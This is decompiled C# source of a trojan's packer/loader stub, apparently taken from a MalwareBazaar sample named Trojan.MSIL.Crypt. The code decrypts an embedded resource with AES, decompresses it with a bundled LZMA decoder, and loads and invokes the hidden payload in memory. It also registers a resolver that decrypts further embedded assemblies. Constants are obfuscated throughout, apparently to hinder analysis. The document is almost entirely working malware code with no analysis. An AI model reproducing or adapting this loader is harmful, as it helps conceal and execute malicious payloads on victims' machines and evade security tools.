// Decompiled with JetBrains decompiler
// Type: CompressShell
// Assembly: Direct, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C54E233E-13C4-0B88-6455-0470AFB371DD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\Trojan.MSIL.Crypt.hzmu-368b39e184619fe18d6682aa9265ce350403dea3ecda0ecd4d3cc37bc42ce390.exe

using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

internal static class CompressShell
{
  private static string Res = "簅\uE34C\uF074䞊覓壖재ꥼ";
  private static ulong Rid = (ulong) (((-28156919L + (-352064520L - -826299520L) ^ 2304602179L - (-479638329L + (-432841801L - -1105310033L))) - -1457503300L + ((677762765L ^ 2097849964L) + -904119270L - -1284140965L) - ((-714126383L ^ -2026917550L) + ((-1889408391L ^ -46192156L) + -1907529288L)) + -1256008878L + -467525936L ^ -182387074L + (-1817019900L ^ -810453048L)) + -416492628L);
  private static Module Mod;

  public static uint GetLenToPosState(uint len)
  {
    len -= 2U;
    return len < 4U ? len : 3U;
  }

  private static Assembly DecryptAsm(object sender, ResolveEventArgs e)
  {
    byte[] bytes = Encoding.UTF8.GetBytes(e.Name);
    for (int index = 0; index < bytes.Length; ++index)
      bytes[index] = (byte) ((int) bytes[index] ^ 1931620225 - (-1991187491 - 1549960526) - (914597809 + 263203110) ^ index);
    Stream manifestResourceStream = typeof (CompressShell).Assembly.GetManifestResourceStream(Encoding.UTF8.GetString(bytes));
    if (manifestResourceStream == null)
      return (Assembly) null;
    byte[] asm;
    using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
      asm = binaryReader.ReadBytes((int) manifestResourceStream.Length);
    byte[] numArray = CompressShell.Decrypt(asm);
    Assembly assembly = Assembly.Load(numArray);
    Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
    return assembly;
  }

  private static Assembly ResolveResource(object sender, ResolveEventArgs e)
  {
    byte[] bytes = Encoding.UTF8.GetBytes(e.Name);
    for (int index = 0; index < bytes.Length; ++index)
      bytes[index] = (byte) ((int) bytes[index] ^ (1532440433 ^ 324693554 - 220482834) - 259552823 ^ 826521425 ^ 2091593504 ^ index);
    Stream manifestResourceStream = typeof (CompressShell).Assembly.GetManifestResourceStream(Encoding.UTF8.GetString(bytes));
    if (manifestResourceStream == null)
      return (Assembly) null;
    byte[] asm;
    using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
      asm = binaryReader.ReadBytes((int) manifestResourceStream.Length);
    byte[] numArray = CompressShell.Decrypt(asm);
    Assembly assembly = Assembly.Load(numArray);
    Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
    return assembly;
  }

  private static byte[] Decrypt(byte[] asm)
  {
    byte[] buffer1;
    byte[] rgbIV;
    byte[] rgbKey;
    using (BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(asm)))
    {
      buffer1 = binaryReader.ReadBytes(binaryReader.ReadInt32());
      rgbIV = binaryReader.ReadBytes(binaryReader.ReadInt32());
      rgbKey = binaryReader.ReadBytes(binaryReader.ReadInt32());
    }
    int num1 = 1425232378 - (1815983815 - 390751602);
    for (int index = 0; index < rgbKey.Length; index += 4)
    {
      rgbKey[index] ^= (byte) (num1 & (int) byte.MaxValue);
      rgbKey[index + 1] ^= (byte) ((num1 & 262025902 - 261960622) >> 8);
      rgbKey[index + 2] ^= (byte) ((num1 & 16711680) >> 16);
      rgbKey[index + 3] ^= (byte) (((long) num1 & 4278190080L) >> 17825946 - 17825922);
    }
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    using (CryptoStream inStream = new CryptoStream((Stream) new MemoryStream(buffer1), rijndaelManaged.CreateDecryptor(rgbKey, rgbIV), CryptoStreamMode.Read))
    {
      byte[] buffer2 = new byte[4];
      inStream.Read(buffer2, 0, 4);
      uint uint32 = BitConverter.ToUInt32(buffer2, 0);
      CompressShell.LzmaDecoder lzmaDecoder = new CompressShell.LzmaDecoder();
      byte[] numArray = new byte[5];
      inStream.Read(numArray, 0, 5);
      lzmaDecoder.SetDecoderProperties(numArray);
      long outSize = 0;
      for (int index = 0; index < 8; ++index)
      {
        int num2 = inStream.ReadByte();
        if (num2 < 0)
          throw new Exception("Can't Read 1");
        outSize |= (long) (byte) num2 << (8 * index & (846553788 ^ 2081873643 - (142788064 ^ 375669364 ^ 1774715313 ^ 222313560) ^ 870139629));
      }
      byte[] buffer3 = new byte[outSize];
      long inSize = (long) (uint32 - 13U);
      lzmaDecoder.Code((Stream) inStream, (Stream) new MemoryStream(buffer3, true), inSize, outSize);
      return buffer3;
    }
  }

  private static ulong modPow(ulong bas, ulong pow, ulong mod)
  {
    ulong num = 1;
    while (pow > 0UL)
    {
      if (((long) pow & 1L) != 0L)
        num = num * bas % mod;
      pow >>= 1;
      bas = bas * bas % mod;
    }
    return num;
  }

  [STAThread]
  private static int Main(string[] args)
  {
    Assembly entryAssembly = Assembly.GetEntryAssembly();
    Stream manifestResourceStream = entryAssembly.GetManifestResourceStream(CompressShell.Res);
    byte[] asm;
    using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
      asm = binaryReader.ReadBytes((int) manifestResourceStream.Length);
    byte[] numArray = CompressShell.Decrypt(asm);
    CompressShell.Mod = entryAssembly.LoadModule("___.netmodule", numArray);
    Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
    AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CompressShell.DecryptAsm);
    MethodBase methodBase = CompressShell.Mod.ResolveMethod(2066856951 ^ -1678021527 - 1685533377 - 109101716 ^ 840974439 + 437423228 | (int) CompressShell.modPow(CompressShell.Rid, (ulong) ((-1971018195 - 881525839 ^ 986718419 ^ 1348451973) - 404189725 - 660524324), (ulong) (-361493945L + 1691237172L)));
    object obj;
    if (methodBase.GetParameters().Length == 1)
      obj = methodBase.Invoke((object) null, new object[1]
      {
        (object) args
      });
    else
      obj = methodBase.Invoke((object) null, (object[]) null);
    return obj is int num ? num : 0;
  }

  public struct State
  {
    public uint Index;

    public void Init() => this.Index = 0U;

    public void UpdateChar()
    {
      if (this.Index < 4U)
        this.Index = 0U;
      else if (this.Index < 10U)
        this.Index -= 3U;
      else
        this.Index -= 6U;
    }

    public void UpdateMatch() => this.Index = this.Index < 7U ? 7U : 10U;

    public void UpdateRep() => this.Index = this.Index < 7U ? 8U : 11U;

    public void UpdateShortRep() => this.Index = this.Index < 7U ? 9U : 11U;

    public bool IsCharState() => this.Index < 7U;
  }

  public class OutWindow
  {
    private byte[] _buffer;
    private uint _pos;
    private uint _windowSize;
    private uint _streamPos;
    private Stream _stream;

    public void Create(uint windowSize)
    {
      if ((int) this._windowSize != (int) windowSize)
        this._buffer = new byte[(IntPtr) windowSize];
      this._windowSize = windowSize;
      this._pos = 0U;
      this._streamPos = 0U;
    }

    public void Init(Stream stream, bool solid)
    {
      this.ReleaseStream();
      this._stream = stream;
      if (solid)
        return;
      this._streamPos = 0U;
      this._pos = 0U;
    }

    public void ReleaseStream()
    {
      this.Flush();
      this._stream = (Stream) null;
      Buffer.BlockCopy((Array) new byte[this._buffer.Length], 0, (Array) this._buffer, 0, this._buffer.Length);
    }

    public void Flush()
    {
      uint count = this._pos - this._streamPos;
      if (count == 0U)
        return;
      this._stream.Write(this._buffer, (int) this._streamPos, (int) count);
      if (this._pos >= this._windowSize)
        this._pos = 0U;
      this._streamPos = this._pos;
    }

    public void CopyBlock(uint distance, uint len)
    {
      uint num = (uint) ((int) this._pos - (int) distance - 1);
      if (num >= this._windowSize)
        num += this._windowSize;
      for (; len > 0U; --len)
      {
        if (num >= this._windowSize)
          num = 0U;
        this._buffer[(IntPtr) this._pos++] = this._buffer[(IntPtr) num++];
        if (this._pos >= this._windowSize)
          this.Flush();
      }
    }

    public void PutByte(byte b)
    {
      this._buffer[(IntPtr) this._pos++] = b;
      if (this._pos < this._windowSize)
        return;
      this.Flush();
    }

    public byte GetByte(uint distance)
    {
      uint index = (uint) ((int) this._pos - (int) distance - 1);
      if (index >= this._windowSize)
        index += this._windowSize;
      return this._buffer[(IntPtr) index];
    }
  }

  private class Decoder
  {
    public uint Range;
    public uint Code;
    public Stream Stream;

    public void Init(Stream stream)
    {
      this.Stream = stream;
      this.Code = 0U;
      this.Range = uint.MaxValue;
      for (int index = 0; index < 5; ++index)
        this.Code = this.Code << 8 | (uint) (byte) this.Stream.ReadByte();
    }

    public void ReleaseStream() => this.Stream = (Stream) null;

    public void Normalize()
    {
      for (; this.Range < (uint) ((1948155115 ^ 1464713933 - 1161033532 + 1390513955 ^ (1325101908 ^ 556032152) - 1388163941) - 214189624); this.Range <<= 8)
        this.Code = this.Code << 8 | (uint) (byte) this.Stream.ReadByte();
    }

    public uint DecodeDirectBits(int numTotalBits)
    {
      uint range = this.Range;
      uint num1 = this.Code;
      uint num2 = 0;
      for (int index = numTotalBits; index > 0; --index)
      {
        range >>= 1;
        uint num3 = num1 - range >> (1686869796 ^ -1871797653 - 847075299 ^ 849598353) + 19697925 - 218471203;
        num1 -= range & num3 - 1U;
        num2 = (uint) ((int) num2 << 1 | 1 - (int) num3);
        if (range < (uint) (-486296781 - 2107456979 - (700684694 ^ 2087862113) ^ -667796640 - 1850676064 - 1529764247))
        {
          num1 = num1 << 8 | (uint) (byte) this.Stream.ReadByte();
          range <<= 8;
        }
      }
      this.Range = range;
      this.Code = num1;
      return num2;
    }
  }

  private struct BitDecoder
  {
    private uint Prob;

    public void Init() => this.Prob = (uint) ((-1468075523 - 1270057383 + ((738835383 ^ 1015726981) + (1697857811 - 1065794088) ^ 495630725 ^ -1656277428 - (-852858237 - 1548316892)) - (554138090 + 1098681368 - (1223467718 ^ 253936998)) ^ 982615453 + (1020208519 - 558082752) - (583309403 + (1541460479 ^ 2065719405) ^ 136888582) ^ 1246166075 ^ -1875338177 - 996249109 ^ 1115306493 ^ 354179184 ^ 667122374) - 763549202);

    public uint Decode(CompressShell.Decoder rangeDecoder)
    {
      uint num = (rangeDecoder.Range >> 11) * this.Prob;
      if (rangeDecoder.Code < num)
      {
        rangeDecoder.Range = num;
        this.Prob += (uint) ((529142260 ^ 370113326) - 159736538) - this.Prob >> 5;
        if (rangeDecoder.Range < (uint) (455056628 + (2034039406 - 384141381) ^ 2088177437))
        {
          rangeDecoder.Code = rangeDecoder.Code << 8 | (uint) (byte) rangeDecoder.Stream.ReadByte();
          rangeDecoder.Range <<= 8;
        }
        return 0;
      }
      rangeDecoder.Range -= num;
      rangeDecoder.Code -= num;
      this.Prob -= this.Prob >> 5;
      if (rangeDecoder.Range < (uint) (1910726647 - 1631841306 ^ 1431720969 - 87994147 ^ -418614228 - (1740411862 ^ 2085408401 ^ 1665646510) ^ (597089477 ^ 621936097 ^ 2568514 + 1981684422) - 1088825012))
      {
        rangeDecoder.Code = rangeDecoder.Code << 8 | (uint) (byte) rangeDecoder.Stream.ReadByte();
        rangeDecoder.Range <<= 8;
      }
      return 1;
    }
  }

  private struct BitTreeDecoder
  {
    private CompressShell.BitDecoder[] Models;
    private int NumBitLevels;

    public BitTreeDecoder(int numBitLevels)
    {
      this.NumBitLevels = numBitLevels;
      this.Models = new CompressShell.BitDecoder[1 << (numBitLevels & (-1432276970 - (-865047275 - 1298600567 - (-1425177589 - 1207010190 ^ 484629365 ^ 1708924912) - (1806249981 ^ 1482013156)) ^ -1310759524 - (-1464530964 - ((1352423978 ^ 1388238447) + 666773868 + (1471092504 - 1033742635)))) - (-1020558451 - 1464009308 - 926732169))];
    }

    public void Init()
    {
      for (uint index = 1; (long) index < (long) (1 << (this.NumBitLevels & ((839823706 ^ 1512279330 ^ 1536659694) + (181700883 - 161205808) ^ 1596908956 ^ -1635046137 - 756681519 - (1504176179 - 333061832) - 112544359 ^ (167172691 - 122170951 ^ 1445423832 - (1726490454 ^ 2046625297) ^ 1211340066 - 331365791) + (613781995 + 1258688405 - (1151382432 ^ 1118761665) - (1426974628 - (1051913304 - 321336667) ^ 1247939933)) + (1404228381 - 201071204)))); ++index)
        this.Models[(IntPtr) index].Init();
    }

    public uint Decode(CompressShell.Decoder rangeDecoder)
    {
      uint index = 1;
      for (int numBitLevels = this.NumBitLevels; numBitLevels > 0; --numBitLevels)
        index = (index << 1) + this.Models[(IntPtr) index].Decode(rangeDecoder);
      return index - (uint) (1 << (this.NumBitLevels & (-1524898622 - 1414478191 ^ -1109099989 - 1111471745 ^ 552019184 + (2144391333 - 839080706 + 570633042 ^ 2140843274 ^ 1995474936 ^ 1815857649))));
    }

    public uint ReverseDecode(CompressShell.Decoder rangeDecoder)
    {
      uint index1 = 1;
      uint num1 = 0;
      for (int index2 = 0; index2 < this.NumBitLevels; ++index2)
      {
        uint num2 = this.Models[(IntPtr) index1].Decode(rangeDecoder);
        index1 = (index1 << 1) + num2;
        num1 |= num2 << (index2 & ((1593144105 ^ 1236700532) + 49830546 ^ 304516897 + 226018167 + (-1291320189 - 1745298878) ^ 1201321039 - 601169266 + (-1585687165 - (1782490211 + 244772739)) ^ 1410540336 - 1348209228) - 829424119 - (601043664 - (1648102595 ^ 1767407007) - 96631156 - 81076458));
      }
      return num1;
    }

    public static uint ReverseDecode(
      CompressShell.BitDecoder[] Models,
      uint startIndex,
      CompressShell.Decoder rangeDecoder,
      int NumBitLevels)
    {
      uint num1 = 1;
      uint num2 = 0;
      for (int index = 0; index < NumBitLevels; ++index)
      {
        uint num3 = Models[(IntPtr) (startIndex + num1)].Decode(rangeDecoder);
        num1 = (num1 << 1) + num3;
        num2 |= num3 << (index & (753027309 - (54928221 ^ 1014420562 + 1096465715 - (1564924708 ^ 115392700 + (1657075628 ^ 1571443381 ^ 37826273) ^ 1831517647)) ^ 1745915566 - (143602664 ^ 1676475964 - 60522926 - 310559461)));
      }
      return num2;
    }
  }

  public class LzmaDecoder
  {
    private CompressShell.OutWindow m_OutWindow = new CompressShell.OutWindow();
    private CompressShell.Decoder m_RangeDecoder = new CompressShell.Decoder();
    private CompressShell.BitDecoder[] m_IsMatchDecoders = new CompressShell.BitDecoder[(IntPtr) (uint) (1999256849 - 1390035926 - (-1957891556 - 1727855009))];
    private CompressShell.BitDecoder[] m_IsRepDecoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRepG0Decoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRepG1Decoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRepG2Decoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRep0LongDecoders = new CompressShell.BitDecoder[(IntPtr) (uint) (1463419689 + 91141787 ^ 1554561284)];
    private CompressShell.BitTreeDecoder[] m_PosSlotDecoder = new CompressShell.BitTreeDecoder[new IntPtr(4)];
    private CompressShell.BitDecoder[] m_PosDecoders = new CompressShell.BitDecoder[new IntPtr(114)];
    private CompressShell.BitTreeDecoder m_PosAlignDecoder = new CompressShell.BitTreeDecoder(4);
    private CompressShell.LzmaDecoder.LenDecoder m_LenDecoder = new CompressShell.LzmaDecoder.LenDecoder();
    private CompressShell.LzmaDecoder.LenDecoder m_RepLenDecoder = new CompressShell.LzmaDecoder.LenDecoder();
    private CompressShell.LzmaDecoder.LiteralDecoder m_LiteralDecoder = new CompressShell.LzmaDecoder.LiteralDecoder();
    private uint m_DictionarySize;
    private uint m_DictionarySizeCheck;
    private uint m_PosStateMask;
    private bool _solid;

    public LzmaDecoder()
    {
      this.m_DictionarySize = uint.MaxValue;
      for (int index = 0; index < 4; ++index)
        this.m_PosSlotDecoder[index] = new CompressShell.BitTreeDecoder(6);
    }

    private void SetDictionarySize(uint dictionarySize)
    {
      if ((int) this.m_DictionarySize == (int) dictionarySize)
        return;
      this.m_DictionarySize = dictionarySize;
      this.m_DictionarySizeCheck = Math.Max(this.m_DictionarySize, 1U);
      this.m_OutWindow.Create(Math.Max(this.m_DictionarySizeCheck, (uint) ((-1574020593 - 886476204 - 5295837 ^ -458742849 - (-1592183778 - 621801180 - (296837803 + (220792361 + (1759872271 ^ 1342898552))) ^ 1006968465 ^ 1834660372 - 217283826) - 239136511 + (-2017134483 - (-182923157 - 1970884236))) - 191677068)));
    }

    private void SetLiteralProperties(int lp, int lc) => this.m_LiteralDecoder.Create(lp, lc);

    private void SetPosBitsProperties(int pb)
    {
      uint numPosStates = (uint) (1 << (pb & (904078905 ^ -1768073669 - (999559246 + ((-1558739584 - (1157741414 ^ 469788904) ^ ((515817680 ^ 523293386 ^ 3062082) + (1483307578 + 627441973) ^ 2020128468 ^ 103810173) + (-1052338836 - 1707451133) ^ 1279129898) - 739317172)) + (1850846795 - 1694963137))));
      this.m_LenDecoder.Create(numPosStates);
      this.m_RepLenDecoder.Create(numPosStates);
      this.m_PosStateMask = numPosStates - 1U;
    }

    private void Init(Stream inStream, Stream outStream)
    {
      this.m_RangeDecoder.Init(inStream);
      this.m_OutWindow.Init(outStream, this._solid);
      for (uint index1 = 0; index1 < 12U; ++index1)
      {
        for (uint index2 = 0; index2 <= this.m_PosStateMask; ++index2)
        {
          uint index3 = (index1 << 4) + index2;
          this.m_IsMatchDecoders[(IntPtr) index3].Init();
          this.m_IsRep0LongDecoders[(IntPtr) index3].Init();
        }
        this.m_IsRepDecoders[(IntPtr) index1].Init();
        this.m_IsRepG0Decoders[(IntPtr) index1].Init();
        this.m_IsRepG1Decoders[(IntPtr) index1].Init();
        this.m_IsRepG2Decoders[(IntPtr) index1].Init();
      }
      this.m_LiteralDecoder.Init();
      for (uint index = 0; index < 4U; ++index)
        this.m_PosSlotDecoder[(IntPtr) index].Init();
      for (uint index = 0; index < (uint) (1944229137 ^ -1880669280 - (1211787590 ^ 2115347099 ^ 707487200)); ++index)
        this.m_PosDecoders[(IntPtr) index].Init();
      this.m_LenDecoder.Init();
      this.m_RepLenDecoder.Init();
      this.m_PosAlignDecoder.Init();
    }

    public void Code(Stream inStream, Stream outStream, long inSize, long outSize)
    {
      this.Init(inStream, outStream);
      CompressShell.State state = new CompressShell.State();
      state.Init();
      uint distance = 0;
      uint num1 = 0;
      uint num2 = 0;
      uint num3 = 0;
      ulong pos = 0;
      ulong num4 = (ulong) outSize;
      if (pos < num4)
      {
        if (this.m_IsMatchDecoders[(IntPtr) (state.Index << 4)].Decode(this.m_RangeDecoder) != 0U)
          throw new Exception();
        state.UpdateChar();
        this.m_OutWindow.PutByte(this.m_LiteralDecoder.DecodeNormal(this.m_RangeDecoder, 0U, (byte) 0));
        ++pos;
      }
      while (pos < num4)
      {
        uint posState = (uint) pos & this.m_PosStateMask;
        if (this.m_IsMatchDecoders[(IntPtr) ((state.Index << 4) + posState)].Decode(this.m_RangeDecoder) == 0U)
        {
          byte prevByte = this.m_OutWindow.GetByte(0U);
          this.m_OutWindow.PutByte(state.IsCharState() ? this.m_LiteralDecoder.DecodeNormal(this.m_RangeDecoder, (uint) pos, prevByte) : this.m_LiteralDecoder.DecodeWithMatchByte(this.m_RangeDecoder, (uint) pos, prevByte, this.m_OutWindow.GetByte(distance)));
          state.UpdateChar();
          ++pos;
        }
        else
        {
          uint len;
          if (this.m_IsRepDecoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 1U)
          {
            if (this.m_IsRepG0Decoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 0U)
            {
              if (this.m_IsRep0LongDecoders[(IntPtr) ((state.Index << 4) + posState)].Decode(this.m_RangeDecoder) == 0U)
              {
                state.UpdateShortRep();
                this.m_OutWindow.PutByte(this.m_OutWindow.GetByte(distance));
                ++pos;
                continue;
              }
            }
            else
            {
              uint num5;
              if (this.m_IsRepG1Decoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 0U)
              {
                num5 = num1;
              }
              else
              {
                if (this.m_IsRepG2Decoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 0U)
                {
                  num5 = num2;
                }
                else
                {
                  num5 = num3;
                  num3 = num2;
                }
                num2 = num1;
              }
              num1 = distance;
              distance = num5;
            }
            len = this.m_RepLenDecoder.Decode(this.m_RangeDecoder, posState) + 2U;
            state.UpdateRep();
          }
          else
          {
            num3 = num2;
            num2 = num1;
            num1 = distance;
            len = 2U + this.m_LenDecoder.Decode(this.m_RangeDecoder, posState);
            state.UpdateMatch();
            uint num6 = this.m_PosSlotDecoder[(IntPtr) CompressShell.GetLenToPosState(len)].Decode(this.m_RangeDecoder);
            if (num6 >= 4U)
            {
              int NumBitLevels = (int) (num6 >> 1) - 1;
              uint num7 = (uint) ((2 | (int) num6 & 1) << (NumBitLevels & 2095877462 - 129216627 - 1966660804));
              distance = num6 >= 14U ? num7 + (this.m_RangeDecoder.DecodeDirectBits(NumBitLevels - 4) << 4) + this.m_PosAlignDecoder.ReverseDecode(this.m_RangeDecoder) : num7 + CompressShell.BitTreeDecoder.ReverseDecode(this.m_PosDecoders, (uint) ((int) num7 - (int) num6 - 1), this.m_RangeDecoder, NumBitLevels);
            }
            else
              distance = num6;
          }
          if ((ulong) distance < pos && distance < this.m_DictionarySizeCheck || distance != uint.MaxValue)
          {
            this.m_OutWindow.CopyBlock(distance, len);
            pos += (ulong) len;
          }
          else
            break;
        }
      }
      this.m_OutWindow.Flush();
      this.m_OutWindow.ReleaseStream();
      this.m_RangeDecoder.ReleaseStream();
    }

    public void SetDecoderProperties(byte[] properties)
    {
      int lc = (int) properties[0] % 9;
      int num = (int) properties[0] / 9;
      int lp = num % 5;
      int pb = num / 5;
      uint dictionarySize = 0;
      for (int index = 0; index < 4; ++index)
        dictionarySize += (uint) properties[1 + index] << (index * 8 & (460178470 ^ -1628198866 - 1505567549 - 701022392));
      this.SetDictionarySize(dictionarySize);
      this.SetLiteralProperties(lp, lc);
      this.SetPosBitsProperties(pb);
    }

    private class LenDecoder
    {
      private CompressShell.BitDecoder m_Choice = new CompressShell.BitDecoder();
      private CompressShell.BitDecoder m_Choice2 = new CompressShell.BitDecoder();
      private CompressShell.BitTreeDecoder[] m_LowCoder = new CompressShell.BitTreeDecoder[new IntPtr(16)];
      private CompressShell.BitTreeDecoder[] m_MidCoder = new CompressShell.BitTreeDecoder[new IntPtr(16)];
      private CompressShell.BitTreeDecoder m_HighCoder = new CompressShell.BitTreeDecoder(8);
      private uint m_NumPosStates;

      public void Create(uint numPosStates)
      {
        for (uint numPosStates1 = this.m_NumPosStates; numPosStates1 < numPosStates; ++numPosStates1)
        {
          this.m_LowCoder[(IntPtr) numPosStates1] = new CompressShell.BitTreeDecoder(3);
          this.m_MidCoder[(IntPtr) numPosStates1] = new CompressShell.BitTreeDecoder(3);
        }
        this.m_NumPosStates = numPosStates;
      }

      public void Init()
      {
        this.m_Choice.Init();
        for (uint index = 0; index < this.m_NumPosStates; ++index)
        {
          this.m_LowCoder[(IntPtr) index].Init();
          this.m_MidCoder[(IntPtr) index].Init();
        }
        this.m_Choice2.Init();
        this.m_HighCoder.Init();
      }

      public uint Decode(CompressShell.Decoder rangeDecoder, uint posState)
      {
        if (this.m_Choice.Decode(rangeDecoder) == 0U)
          return this.m_LowCoder[(IntPtr) posState].Decode(rangeDecoder);
        uint num = 8;
        return this.m_Choice2.Decode(rangeDecoder) != 0U ? num + 8U + this.m_HighCoder.Decode(rangeDecoder) : num + this.m_MidCoder[(IntPtr) posState].Decode(rangeDecoder);
      }
    }

    private class LiteralDecoder
    {
      private CompressShell.LzmaDecoder.LiteralDecoder.Decoder2[] m_Coders;
      private int m_NumPrevBits;
      private int m_NumPosBits;
      private uint m_PosMask;

      public void Create(int numPosBits, int numPrevBits)
      {
        if (this.m_Coders != null && this.m_NumPrevBits == numPrevBits && this.m_NumPosBits == numPosBits)
          return;
        this.m_NumPosBits = numPosBits;
        this.m_PosMask = (uint) ((1 << (numPosBits & ((166947204 ^ 262376388) + 1876204249 ^ 839113571 + 1129285773) - 58072778)) - 1);
        this.m_NumPrevBits = numPrevBits;
        uint length = (uint) (1 << (this.m_NumPrevBits + this.m_NumPosBits & -1611127590 - (-1228641976 - (-574595229 - (-1301391381 - (1125067193 ^ 2111062334)))) - 1398877042));
        this.m_Coders = new CompressShell.LzmaDecoder.LiteralDecoder.Decoder2[(IntPtr) length];
        for (uint index = 0; index < length; ++index)
          this.m_Coders[(IntPtr) index].Create();
      }

      public void Init()
      {
        uint num = (uint) (1 << (this.m_NumPrevBits + this.m_NumPosBits & ((551018257 ^ 897242922) - ((1441862769 ^ 931083099 - 401726392 ^ 2098145327 - 892418499 + (147988075 + (1367263492 - 919535902) - (1053863920 - 630023749 ^ 101852691) ^ 490918830 + 361305294)) - (1678286786 - 133713620 + (-2036889448 - 1929733006 + (1482003947 - 122473414 - 1170567762)) - 1210779331)) ^ 379189891 - 131406167 + (2111751357 - 1049430948) - 978622822)));
        for (uint index = 0; index < num; ++index)
          this.m_Coders[(IntPtr) index].Init();
      }

      private uint GetState(uint pos, byte prevByte) => (uint) ((((int) pos & (int) this.m_PosMask) << (this.m_NumPrevBits & -1994112417 - 913505159 - ((129152151 ^ 1395215910) - 32158712))) + ((int) prevByte >> (8 - this.m_NumPrevBits & (552633237 + 1065491391 ^ -1481054742 - (-336042710 - 2009211139) ^ 146625275 ^ -1378236938 - (703068190 - 357690177 - 237395333 + (665452066 ^ 336314449 + 768791789)) ^ 2146790485 - (1206715403 ^ 342085747) + 862912389 ^ (988957386 ^ 257301915 + 1211867192) - 1608320290 + (1374008063 - 453137507)))));

      public byte DecodeNormal(CompressShell.Decoder rangeDecoder, uint pos, byte prevByte) => this.m_Coders[(IntPtr) this.GetState(pos, prevByte)].DecodeNormal(rangeDecoder);

      public byte DecodeWithMatchByte(
        CompressShell.Decoder rangeDecoder,
        uint pos,
        byte prevByte,
        byte matchByte)
      {
        return this.m_Coders[(IntPtr) this.GetState(pos, prevByte)].DecodeWithMatchByte(rangeDecoder, matchByte);
      }

      private struct Decoder2
      {
        private CompressShell.BitDecoder[] m_Decoders;

        public void Create() => this.m_Decoders = new CompressShell.BitDecoder[1573336509 + (1177438273 ^ 1729738754) - 2066830158 ^ ((1720681987 ^ 1888826384 - 540621785) + (1272186385 - 193323316 ^ 1895781031 - 93343084 ^ 867455945) ^ 529918568 ^ 1519837731 - 714535734 - 293776226 ^ (39101097 ^ 718908051) + 931179732) - ((128511604 + (1587504583 - 583565990 ^ -959577364 - 1930516289) ^ 1107862778 - 519965606) - 677024974)];

        public void Init()
        {
          for (int index = 0; index < -305633402 - (2139454477 ^ 122508219) - 1155042410 - (485839185 + (-1097137202 - ((1710512751 - (1936395288 ^ 1987739776) ^ 926114723) - 218244740 - 852974265 ^ 1425750464) - 265960305 - 994624130 ^ 591833073)); ++index)
            this.m_Decoders[index].Init();
        }

        public byte DecodeNormal(CompressShell.Decoder rangeDecoder)
        {
          uint index = 1;
          do
          {
            index = index << 1 | this.m_Decoders[(IntPtr) index].Decode(rangeDecoder);
          }
          while (index < (uint) ((1566447601 ^ 370948097 ^ 1202032922 - 530116731 ^ 347757058 ^ 1933370316 ^ 1923608924 - (-931467522 - 1464910298) ^ 1180973386 - 446090929) + (1088224711 - 245617721 + 107513200 - (1687752595 - 1077889395)) - 1119911902));
          return (byte) index;
        }

        public byte DecodeWithMatchByte(CompressShell.Decoder rangeDecoder, byte matchByte)
        {
          uint index = 1;
          do
          {
            uint num1 = (uint) ((int) matchByte >> 7 & 1);
            matchByte <<= 1;
            uint num2 = this.m_Decoders[(IntPtr) ((uint) (1 + (int) num1 << 8) + index)].Decode(rangeDecoder);
            index = index << 1 | num2;
            if ((int) num1 != (int) num2)
            {
              while (index < (uint) (-1228289553 - (478063138 ^ 2060817217 - (337463411 + 626511240 + 398896791) ^ 2029021523) - 1773320977))
                index = index << 1 | this.m_Decoders[(IntPtr) index].Decode(rangeDecoder);
              break;
            }
          }
          while (index < (uint) (1769230977 - (-2102027884 - 423708691)));
          return (byte) index;
        }
      }
    }
  }
}
